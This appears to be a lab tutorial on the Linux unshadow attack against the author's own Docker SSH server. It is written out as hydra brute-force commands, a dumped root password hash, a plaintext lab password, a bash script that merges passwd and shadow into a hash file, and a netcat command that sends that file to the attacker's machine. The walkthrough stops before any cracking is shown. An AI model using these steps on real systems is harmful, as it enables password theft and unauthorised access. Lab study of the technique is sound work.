<h1 align="center"> Unshadow Attack </h1>





## What is Unshadow Attack?
**An unshadow attack** is a technique used during post-exploitation in Linux/Unix systems to crack user passwords by combining two critical files:
- `/etc/passwd`: /etc/passwd: Contains user account information (including usernames and user IDs). Historically stored password hashes here, but modern systems store only placeholder 'x' to indicate that the actual hash is in `/etc/shadow`.
- `/etc/shadow`: Stores the actual password hashes (in a hashed and often salted format) and is readable only by root.


#### The Core Concept:
An Unshadow Attack combines the /etc/passwd and /etc/shadow files to extract password hashes for cracking.

### Why It Works:
`/etc/passwd`: Contains user info (readable by all)
`/etc/shadow`: Contains password hashes (readable by root only)
When you can read BOTH files, you can extract hashes for cracking



## Understanding Linux Password Storage:
### The Old Way (Less Secure):

- `/etc/passwd`
````
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
````
- `x` means password is in `/etc/shadow`.
- All user info readable by anyone

### The Modern Way (More Secure):
- `/etc/passwd`:
````
root:x:0:0:root:/root:/bin/bash
````

- `/etc/shadow` (root only)
````
root:$6$salt$hashedpassword:19147:0:99999:7:::
daemon:*:19147:0:99999:7:::
````




### Shadow File Format:
````
username:$hashing_algorithm$salt$hash:last_changed:min_days:max_days:warn_days:inactive_days:expire_date:reserved
````
- Example Breakdown:
````
alice:$6$somesalt$abcdef123456...:19147:0:99999:7:::
      ^ ^       ^
      | |       |
      | |       └── Hash
      | └── Salt
      └── Hash Type (6 = SHA-512)
````


## Hash Types in Linux:

### Common Hash Algoritms:

| **ID** | **Algorithm**         | **Example Format** |
| ------ | --------------------- | ------------------ |
| **1**  | MD5                   | `$1$salt$hash`     |
| **2a** | Blowfish (bcrypt)     | `$2a$salt$hash`    |
| **5**  | SHA-256               | `$5$salt$hash`     |
| **6**  | SHA-512 (Most Common) | `$6$salt$hash`     |

---



# Unshadow Methodology:

- So in this I test with my `SSH Server` that i was setup in my docker:
<img width="1556" height="630" alt="image" src="https://github.com/user-attachments/assets/a4284ace-6a5d-4d3f-86ee-fc1c4d55af0f" />

- After I scan my target:
````
nmap 192.168.100.97 -sV -T4
````

- Now i found our target open port `SSH`.

- After i do cracking password, also in this i used with hydra:
````
hydra -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/passwd.txt -t 4 -s 2222 192.168.100.97 ssh -V -f
````
<img width="1705" height="768" alt="image" src="https://github.com/user-attachments/assets/e1d61721-2f75-4365-9a44-6f7e4f4e867c" />

<img width="924" height="574" alt="image" src="https://github.com/user-attachments/assets/a30de208-7716-4ab9-9f0a-28c900e84b7a" />

- Now i found the correct username and password.


- In this if i try to brute force others ican find `root`:
````
hydra -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/passwd.txt -t 4 -s 2222 192.168.100.97 ssh -V -f
````
<img width="1799" height="696" alt="image" src="https://github.com/user-attachments/assets/358f31df-92a5-4757-935e-d87719bcac0b" />

<img width="897" height="576" alt="image" src="https://github.com/user-attachments/assets/cf3f7b07-382b-4c44-899a-fcf37e1601a2" />


- In this i can login both of it, Then i login to target:
````
ssh lowpriv@192.168.100.97 -p 2222
````
<img width="760" height="191" alt="image" src="https://github.com/user-attachments/assets/57a03750-6b63-4087-82f4-30eb5d30cc25" />

- Password: `k4n0ng`

- If i try `root`:
````
ssh root@192.168.100.97 -p 2222
````
<img width="851" height="227" alt="image" src="https://github.com/user-attachments/assets/3099ca3c-009b-425b-a0e6-9469b0783961" />


---




## Check shadow & Passwd file:

### Check shadow file:
- After we got root check then check shadow file:
````
cat /etc/shadow
````
<img width="1403" height="607" alt="image" src="https://github.com/user-attachments/assets/7c901acf-eb31-43a8-86fe-ee3a9dc66a98" />

- `/etc/shadow`: is a system file that stores encrypted user password hashes and account aging information (like password expiration).
- this command shows all user password hashes and related metadata

#### Format of each line:
- Each line follows this colon-separated format:
````
username:password_hash:last_change:min:max:warn:inactive:expire:reserved
````
- We’ll break down the `root` entry as an example:
````
root:$6$UrwaTDxeLHYzjjvJ$eNGkoA.fKHPWEf7fTEdIwJXzqtjinmnO3zvS53TaJjvgyawHqR0dJbUCNLIXbi.m7afLM2JGnUNgLphP4z6B7/:20408:0:99999:7:::
````
| Field                  | Value                                                  |
| ---------------------- | ------------------------------------------------------ |
| **Username**           | root                                                   |
| **Account name**       | *(empty)*                                              |
| **Password hash**      | `$6$UrwaTDxeLHYzjjvJ$eNGkoA...`                        |
| **Encrypted password** | *(see password hash)*                                  |
| **Last change**        | 20408 (days since Jan 1, 1970)                         |
| **Min**                | 0 (minimum days between password changes)              |
| **Max**                | 99999 (maximum days password is valid → ~273 years)    |
| **Warn**               | 7 (days before expiry to warn user)                    |
| **Inactive**           | *(empty)* (days after expiry before disabling account) |
| **Expire**             | *(empty)* (date the account expires)                   |
| **Reserved**           | *(empty)* (unused)                                     |


### Check Passwd file:
````
cat /etc/passwd
````
<img width="926" height="595" alt="image" src="https://github.com/user-attachments/assets/8027489b-7fca-4539-8cea-8ac5bda8e0a5" />

#### Format of Each line:
- Each line follows this colon-separated format:
````
username:password_field:UID:GID:GECOS:homedir:shell
````
- Example:
````
lowpriv:x:1000:1000::/home/lowpriv:/bin/bash
````
| **Field**          | **Value**     | **Meaning**                                              |
| ------------------ | ------------- | -------------------------------------------------------- |
| **Username**       | lowpriv       | Login name                                               |
| **Password field** | x             | Password stored securely in `/etc/shadow`                |
| **UID**            | 1000          | User ID (0 = root; 1–999 = system; ≥1000 = normal users) |
| **GID**            | 1000          | Primary group ID                                         |
| **GECOS**          | *(empty)*     | Optional info (real name, phone, etc.)                   |
| **Home directory** | /home/lowpriv | User’s home folder                                       |
| **Login shell**    | /bin/bash     | Shell executed on login                                  |

#### Key Observations from Your Output
- Regular User Accounts
These are real human or service accounts with login capability:
  - `root` — UID 0 → superuser
  - `lowpriv` — UID 1000 → likely a low-privilege user (common target for privilege escalation)
  - `adminuser` — UID 1001 → probably an admin account
  - `rootlike` — UID 1002 → suspicious name; could be a decoy or alternate root
All three (`lowpriv`, `adminuser`, `rootlike`) have:

  - `/bin/bash` as shell → can log in interactively
  - Home directories under `/home/`

- System/Service Accounts
UIDs < 1000 (or 65534 for `nobody`)
Shell is usually `/usr/sbin/nologin` → cannot log in
Used to run background services securely with minimal privileges

---




## Unshadow Attack:

### Obtain both Files:

#### Direct Access (If You Have Root)
- Copy file:
````
cp /etc/passwd /tmp/passwd.copy
cat /tmp/passwd.copy
````
<img width="934" height="611" alt="image" src="https://github.com/user-attachments/assets/420fbf85-d32c-4150-b863-055a9311ae60" />


````
cp /etc/shadow /tmp/shadow.copy
cat /tmp/shadow.py
````
<img width="1405" height="619" alt="image" src="https://github.com/user-attachments/assets/92339097-461f-433f-9d91-9d78901df60b" />


#### Privilege Escalation Paths
- Check if shadow is world-readable (rare)
````
ls -la /etc/shadow
````
<img width="587" height="114" alt="image" src="https://github.com/user-attachments/assets/7843a11b-b6f0-4bb5-8928-895e2876623a" />

- `/etc/shadow`: is the secure password database on linux.
- **permission**: `-rw-r-----`:
  - Root can **read / write**
  - Group `shadow` can read only.
  - Others have no access
- **Owner**: `root` -> only the superuser controls it.
- **Group**: `shadow` → special group for system utilities that need to read password hashes.
- **Size**: `1181 bytes` → the file length (depends on number of accounts).
- **Date/Time**: `Nov 16 11:28` → last modified (usually when a password was changed or a new account added).
- **File name**: `/etc/shadow` → contains hashed passwords and aging info for all accounts.


- Check SUID binaries that might read shadow:
````
find / -perm -4000 -type f 2>/dev/null | xargs strings 2>/dev/null | grep -i shadow
````
<img width="1102" height="616" alt="image" src="https://github.com/user-attachments/assets/2faf83ed-5366-41b1-9aff-a66df3eef049" />

- This command finds all **SUID binaries**, extract readable strings from them, and check if any reference `/etc/shadow`.



- Look for backus:
````
find / -name "*shadow*" -o -name "*passwd*" 2>/dev/null
````
<img width="858" height="755" alt="image" src="https://github.com/user-attachments/assets/fa7249f4-6f7a-48df-9bf2-d96b9831558e" />


````
find / -name "*.bak" -o -name "*backup*" 2>/dev/null
````
<img width="808" height="151" alt="image" src="https://github.com/user-attachments/assets/d8a5f6c8-6d44-49e2-b4a2-6449e8e28d2d" />


- Check web backup:
````
ls -la /var/backups/
````
<img width="516" height="153" alt="image" src="https://github.com/user-attachments/assets/73b60b74-614c-4a4e-8700-5d1c1bd7dd7d" />





### Extract Hashes with Unshadow:

#### Using John the Ripper's unshadow:
````
unshadow /etc/passwd /etc/shadow > /tmp/hashes.txt
````
<img width="767" height="101" alt="image" src="https://github.com/user-attachments/assets/0fb437a0-d3e3-4fab-92f9-b112d5831261" />

- But in this it not work.


#### Manual Extraction:
````
#!/bin/bash
while IFS=: read -r user pass uid gid gecos home shell; do
    if grep -q "^$user:" /etc/shadow; then
        shadow_hash=$(grep "^$user:" /etc/shadow | cut -d: -f2)
        echo "$user:$shadow_hash:$uid:$gid:$gecos:$home:$shell"
    fi
done < /etc/passwd > /tmp/hashes.txt
````
<img width="1580" height="740" alt="image" src="https://github.com/user-attachments/assets/b833c747-42cc-42ef-8eec-eb1e37ade454" />

- Now we get success to get Hash.


### Crack the Hashes:

#### Using John the ripper:
- But in this in my target don't have `john` tool, so i need to copy hash.txt file to my kali:

- On my kali:
````
nc -lvp 4444 > hashes.txt
````




- After in target:
in this i need to check my kali IP:
````
ifconfig
````


````
nc 192.168.127.128 4444 < /tmp/hashes.txt
````





















